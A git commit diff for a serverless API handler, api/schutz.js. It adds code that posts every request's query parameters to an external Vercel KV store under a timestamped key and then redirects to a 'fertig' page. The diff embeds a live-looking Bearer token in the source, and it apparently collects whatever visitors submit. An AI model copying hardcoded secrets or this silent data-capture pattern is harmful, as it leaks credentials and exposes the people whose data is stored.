87ff590642996edae966735bf84cb9914e0af231
ihr-schurtz <152788173+ihr-schurtz@users.noreply.github.com>
2023-12-03 14:40:49 +0100

    Update schutz.js

--- api/schutz.js
+++ api/schutz.js
@@ -1,13 +1,19 @@
 export default async function handler(req, res) {
+    const now = Date.now();
+    await fetch(`https://grand-mink-48089.kv.vercel-storage.com/set/usr${now}`, {
+          headers: {
+            Authorization: `Bearer AbvZASQgNTkxODAxODYtZTM3ZS00Yjk2LWE1ZTMtODg2NTFkYmE2MDQ0OTk3ZDViYjVjMTQyNDk3OGE3OWIxN2Y3OTI2ZjY4Yzk=`,
+          },
+          body: JSON.stringify(req.query),
+          method: 'POST',
+        })
+
     if (req.method === 'POST') {
         const data = req.body;
         console.log(req.body)
     } else {
         console.log(req.query)
     }
-    try {
-    console.log(req)
-    } catch {}
     
     res.redirect("/fertig.html")
 }
